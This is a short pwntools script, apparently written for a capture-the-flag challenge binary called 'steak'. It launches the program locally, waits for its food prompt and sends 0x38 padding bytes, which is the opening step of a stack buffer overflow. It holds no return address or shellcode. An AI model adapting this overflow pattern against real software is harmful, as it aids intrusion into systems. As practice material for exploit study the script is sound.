from pwn import *
p = process('./steak')
payload  = ''
payload += 'a'*0x38
p.recvuntil('What\'s your favorite food?')
raw_input()
p.sendline(payload)
p.interactive()
